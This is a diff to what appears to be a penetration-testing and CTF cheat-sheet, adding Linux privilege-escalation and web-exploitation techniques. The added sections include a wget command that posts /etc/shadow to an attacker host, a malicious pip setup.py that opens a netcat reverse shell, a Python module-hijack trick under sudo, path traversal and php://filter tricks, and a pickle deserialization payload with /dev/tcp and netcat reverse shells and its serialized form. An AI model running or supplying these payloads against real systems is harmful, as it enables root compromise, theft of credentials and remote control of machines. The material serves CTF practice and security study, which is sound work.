@@ -1610,13 +1610,14 @@ Privilege escalation from g0tm1lk blog
 
 Once, we have got the unprivileged shell, it is very important to check the below things
 
+* Did you tried "sudo -l" and check if we have any binaries which can be executed as root?
 * Are there any binaries with Sticky, suid, guid.
 * Are there any world-writable folders, files.
 * Are there any world-execuable files.
 * Which are the files owned by nobody (No user)
 * Which are the files which are owned by a particular user but are not present in their home directory. (Mostly, the users have files and folders in /home directory. However, that's not always the case.)
 * What are the processes running on the machines? (ps aux). Remember, If something like knockd is running, we would come to know that Port Knocking is required.
-* What are the packages installed? (dpkg -l). Maybe some vulnerable application is installed ready to be exploited (For example: chkroot version 0.49).
+* What are the packages installed? (dpkg -l for debian) (pip list for python packages). Maybe some vulnerable application is installed ready to be exploited (For example: chkroot version 0.49 or couchdb 1.7).
 * What are the services running? (netstat -ln)
 * Check the entries in the crontab!
 * What are the files present in the /home/user folder? Are there any hidden files and folders? like .thunderbird/ .bash_history etc.
@@ -1945,6 +1946,81 @@ However, if we have a unprivileged user, it is always better to check whether /b
 
 More details can be found at `Common Pitfalls When Writing Exploits <http://www.mathyvanhoef.com/2012/11/common-pitfalls-when-writing-exploits.html>`_
 
+Executing Python script with sudo
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+If there exists a python script which has a import statement and a user has a permission to execute it using sudo.
+
+::
+
+ <display_script.py> 
+
+ #!/usr/bin/python3
+ import ftplib or import example
+ <Python code utilizing ftplib or example calling some function>
+ print (example.display())
+
+and is executed using
+
+::
+
+ sudo python display_script.py
+
+We can use this to privilege escalate to the higher privileges. As python would imports modules in the current directory first, then from the modules dir (PYTHONPATH), we could make a malicious python script (of the same name of import module such as ftplib or example)
+and have it imported by the program. The malicious script may have a function similar to used in example.py executing our command. e.g.
+
+::
+
+ <example.py>
+ #!/usr/bin/python3
+ import os
+
+ def display():
+    os.system("whoami")
+    exit()
+
+The result would be "root". This is mainly because `sys.path <https://docs.python.org/2/library/sys.html#sys.path>`_ is populated using the current working directory, followed by directories listed in your PYTHONPATH environment variable, followed by installation-dependent default paths, which are controlled by the site module.
+
+
+**Example**
+
+If we run our script with sudo (sudo myscript.py) then the environment variable $USER will be root and the environment variable $SUDO_USER will be the name of the user who executed the command sudo myscript.py. Consider the following scenario:
+
+A linux user bob is logged into the system and possesses sudo privileges. He writes the following python script named myscript.py:
+
+::
+
+    #!/usr/bin/python
+    import os
+    print os.getenv("USER")
+    print os.getenv("SUDO_USER")
+
+He then makes the script executable with chmod +x myscript.py and then executes his script with sudo privileges with the command:
+
+::
+
+ sudo ./myscript.py
+
+The output of that program will be (using python 2.x.x):
+
+::
+
+    root
+    bob
+
+If bob runs the program without sudo privileges with
+
+::
+
+ ./myscript.py
+
+he will get the following output:
+
+::
+
+    bob
+    None
+
 
 MySQL Privileged Escalation
 ---------------------------
@@ -2015,7 +2091,7 @@ When the apt-update would be executed, it would be executed as root and we would
 SUDO -l Permissions
 -------------------
 
-Let's see which executables have permission to run as sudo, We have collated the different methods to get a shell if the below applications are suid: nmap, tee, tcpdump, find and zip.
+Let's see which executables have permission to run as sudo, We have collated the different methods to get a shell if the below applications are suid: nmap, tee, tcpdump, find,  zip and package installers (pip, npm).
 
 nmap suid
 ^^^^^^^^^
@@ -2113,6 +2189,97 @@ Here, the foo file (a blank file) is created using the touch command as the -exe
 
 HollyGrace has mentioned this in `Linux PrivEsc: Abusing SUID <https://www.gracefulsecurity.com/linux-privesc-abusing-suid/>`_ More can be learn `How-I-got-root-with-sudo <https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/>`_.
 
+wget
+^^^^
+
+If the user has permission to run wget as sudo, we can read files (if the user whom we are sudo-ing have the permisson to read) by using --post-file parameter
+
+::
+
+  post_file = file   -- Use POST as the method for all HTTP requests and send the contents of file in the request body. The same as ‘--post-file=file’.
+
+Example:
+
+::
+
+ sudo -u root wget --post-file=/etc/shadow http://AttackerIP:Port
+
+On the attacker side, there can be a nc listener. The above would send the contents of /etc/shadow to the listener in the post request.
+
+Package Installation
+^^^^^^^^^^^^^^^^^^^^
+
+**pip**
+
+If the user have been provided permission to install packages as a sudo for example
+
+::
+
+ User username may run the following commands on hostname:
+    (root) /usr/bin/pip install *
+
+We can exploit this by creating a custom pip package which would provide us a shell.
+
+First, create a folder (Let's name it helloworld), and create two files setup.py and helloworld.py
+
+::
+
+ username@hostname:/tmp/helloworld$ ls
+ helloworld.py setup.py
+
+Let's see, what setup.py contains
+
+::
+
+ cat setup.py
+
+ from setuptools import setup
+ import os
+ print os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/bin/nc 10.10.14.26 4444 >/tmp/f")
+
+ setup(
+     name='helloworld-script',    # This is the name of your PyPI-package.
+     version='0.1',               # Update the version number for new releases
+     scripts=['helloworld']       # The name of your scipt, and also the command you'll be using for calling it
+ )
+
+and helloworld.py
+
+::
+
+ cat helloworld.py
+ #!/usr/bin/env python
+ print "Hello World"
+
+The above can be a part of a sample package of python pip. For more details refer `A sample project that exists for PyPUG's "Tutorial on Packaging and Distributing Projects" <https://github.com/pypa/sampleproject>`_ , `How To Package Your Python Code <http://python-packaging.readthedocs.io/en/latest/index.html>`_ ,
+`A simple Hello World setuptools package and installing it with pip <https://stackoverflow.com/questions/22051360/a-simple-hello-world-setuptools-package-and-installing-it-with-pip>`_
+and `Packaging and distributing projects <https://packaging.python.org/tutorials/distributing-packages/>`_ 
+
+The above package can be installed by using
+
+::
+
+ sudo -u root /usr/bin/pip install -e /tmp/helloworld
+
+ Obtaining file:///tmp/helloworld
+
+The above would execute setup.py and provide us the shell.
+
+Refer `Installing Packages <https://packaging.python.org/tutorials/installing-packages/>`_ for different ways to install a pip package
+
+Let's see the installed application
+
+::
+
+ pip list
+ Flask-CouchDB (0.2.1)
+ helloworld-script (0.1, /tmp/helloworld)
+ Jinja2 (2.10)
+
+**npm**
+
+npm allows packages to take actions that could result in a malicious npm package author to create a worm that spreads across the majority of the npm ecosystem. Refer `npm fails to restrict the actions of malicious npm packages <https://www.kb.cert.org/vuls/id/319816>`_ 
+, `npm install could be dangerous: Rimrafall <https://github.com/joaojeronimo/rimrafall>`_ and `Package install scripts vulnerability <https://blog.npmjs.org/post/141702881055/package-install-scripts-vulnerability>`_ 
 
 Unix Wildcards
 --------------
@@ -2917,6 +3084,45 @@ First things
 
   http://IPAddress/SitePages/Forms/AllPages.aspx
 
+
+CSC Austria: CTF Tips and Tricks
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Refer `SEC Consult – Cyber Security Challenge Austria /CTF Tips & Tricks <https://security-hub.at/download/csc_austria_ctf_tips_and_tricks.pdf>`_
+
+* Read the source code / comments
+* Check for common hidden files / folders (.git, .ssh, robots.txt, backup, .DS_Store, .svn, changelog.txt, server-status, admin, administrator, …)
+* Check for common extensions (Example: If you see a index.php file, check index.php.tmp, index.php.bak, and so on)
+* Play with the URL / parameters / cookies (Example: If you have a page with index.php?role=user try to change it to index.php?role=admin).
+* Get familiar with the website, it’s functionalities and features before starting an in-depth analysis.
+* Try to map the full attack-surface of the website! Some vulnerabilities are hidden deep in hard-to-reach functionalities.
+* Test for the most common vulnerabilities like SQLi (SQL Injection), XXE (XML Entity Injection), Path Traversal, File Uploads, Command Injection, Cookie Tampering, XSS (Cross-Site-Scripting), XPATH Injection, Unserialization bugs, Outdated software, CSRF 
+  (Cross-Site-Request-Forgery), SSRF (Server-Side-Request-Forgery), SSTI (Server-Side Template Injection), LFI/RFI (Local-File-Inclusion / Remote-File-Inclusion), Flaws in Session Management or Authorization Flaws, the randomness of the cookies, and so on.
+* If you come across a technology which you don’t know, try to google security writeups for these technologies.
+* Try special characters 
+  ::
+  
+    (‘, “, {, ;, |, &&, \, /, !(), %…) 
+    
+ in all input fields (GET- and POST parameters and Cookies) and check for uncommon responses or error messages.
+* To detect blind vulnerabilities (SQL injection, command injection, XSS, …) you can use time delays or requests to one of your web servers (check the access logs).
+* If you can provide a path or a filename to the website, you should test for path traversal vulnerabilities. If the application replaces the 
+  ::
+   
+   “../” 
+ with an empty string, you can try to bypass it by injecting the sequence two times, like: 
+ ::
+ 
+  “…/./”. 
+  
+ If the “../” in the center gets replaced, the application will again work with “../”. You can also try different encodings or other removed characters. Moreover, you can try to create or upload (e.g. via archives) a symbolic link.
+* If you found a LFI (local-file-inclusion) vulnerability in a PHP website and you want to read the PHP scripts, you can use php-filter (you can’t normally read .php files because the inclusion would try to execute the code instead of displaying it; 
+  with php-filter you can first base64-encode the content to display it): 
+
+ ::
+ 
+  index.php?filename=php://filter/convert.base64-encode/resource=index.php
+
 htaccess - UserAgent
 ^^^^^^^^^^^^^^^^^^^^
 When you see something like this "Someone's sup3r s3cr3t dr0pb0x - only me and Steve Jobs can see this content". Which says, only this can see me. Try to see what user-agent it is talking about. The way it is implemented is by use of .htaccess file
@@ -3492,6 +3698,72 @@ Grep in input box?
 
  This command searches for any character in the file and comments out the reference to dictionary.txt
 
+Python Pickle
+-------------
+
+If a website is using pickle to serialize and de-serialize the requests and probably using a unsafe way like 
+
+::
+
+  cPickle.loads(data)
+
+The pickle website say *Warning: The pickle module is not intended to be secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.*
+
+we may use
+
+::
+
+  class Shell_code(object):
+  def __reduce__(self):
+          return (os.system,('/bin/bash -i >& /dev/tcp/"Client IP"/"Listening PORT" 0>&1',))
+     or   return (os.system,('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/bin/nc 10.10.14.XX 4444 >/tmp/f')
+  shell = cPickle.dumps(Shell_code())
+
+if we print shell variable above, it would look something like below if python version 2 is used
+
+::
+
+ cposix
+ system
+ p1
+ (S'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/bin/nc 10.10.14.XX 4444 >/tmp/f'
+ p2
+ tp3
+ Rp4
+ .
+
+and in python version 3
+
+::
+
+ b'\x80\x03cposix\nsystem\nq\x00XT\x00\x00\x00/rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/bin/nc 10.10.14.26 4444 >/tmp/fq\x01\x85q\x02Rq\x03.'
+
+Pickle is imported in python 3 as
+
+::
+ 
+ import _pickle as cPickle
+
+and in python 2
+
+::
+
+ import cPickle
+
+
+Now, we can test locally that our code for shell is working by unpickling by
+
+::
+
+ #data.txt containing our Pickled data
+ import cPickle
+ path = "/tmp/data.txt"
+ data = open(path, "rb").read()
+ item = cPickle.loads(data)
+
+Refer `Understanding Python pickling and how to use it securely <https://www.synopsys.com/blogs/software-security/python-pickling/>`_ , `Sour Pickles <http://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf>`_ and `Exploiting misuse of Python's "pickle" <https://blog.nelhage.com/2011/03/exploiting-pickle/>`_
+
+.. Tip :: It might be good idea to use requests (in case of Website) or socket (in case of listener) to send the payload.
 
 Others
 ------
@@ -3830,27 +4102,17 @@ Others
 
 * Sometimes, we don't have tools on the victim machine, in that case we can download static binaries from `Static-Binaries <https://github.com/andrew-d/static-binaries>`_ If not, found, try the deb or rpm package of the binary, extract it and upload.
 
-* If a website is using pickle to serialize and de-serialize the requests and probably using a unsafe way like 
+* mysql can execute statements in one liner using --execute or -e option
 
   ::
 
-   conn,addr = self.receiver_socket.accept()
-   data = conn.recv(1024)
-   return cPickle.loads(data)
+   mysql [options] db_name
+   --user=user_name, -u user_name  : The MariaDB user name to use when connecting to the server.
+   --password[=password], -p[password] : The password to use when connecting to the server. If you use the short option form (-p), you cannot have a space between the option and the password. If you omit the password value following the --password or -p option on the command line, mysql
+           prompts for one.
+   --execute=statement, -e statement : Execute the statement and quit. Disables --force and history file. The default output format is like that produced with --batch.
 
- we may use
-
- ::
-
-  class Shell_code(object):
-  def __reduce__(self):
-          return (os.system,('/bin/bash -i >& /dev/tcp/"Client IP"/"Listening PORT" 0>&1',))
-  shell = cPickle.dumps(Shell_code())
-  client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-  client_socket.connect(('Server IP','Server PORT'))
-  client_socket.send(shell)
-
- Refer `Understanding Python pickling and how to use it securely <https://www.synopsys.com/blogs/software-security/python-pickling/>`_
+* If there's .action file present in the URL on a Apache WebServer, `Apache Struts <https://svn.apache.org/repos/asf/struts/archive/trunk/struts-doc-1.1/api/org/apache/struts/action/package-summary.html>`_ might be installed on it. Check for Apache Struts vulnerabilities on it.
 
 * Handy Stuff
 
@@ -3942,7 +4204,7 @@ Knockd
 
 `Knockd - Port-knocking server <http://www.zeroflux.org/projects/knock>`_ : knockd is a port-knock server. It listens to all traffic on an ethernet (or PPP) interface, looking for special "knock" sequences of port-hits. A client makes these port-hits by sending a TCP (or UDP) packet to a port on the server. This port need not be open -- since knockd listens at the link-layer level, it sees all traffic even if it's destined for a closed port. When the server detects a specific sequence of port-hits, it runs a command defined in its configuration file. This can be used to open up holes in a firewall for quick access.
 
-If there is port knocking involved, read the /etc/knockd.conf, read the sequence port know should be done and execute
+If there is port knocking involved, read the /etc/knockd.conf, read the sequence port knock should be done and execute
 
 ::
 
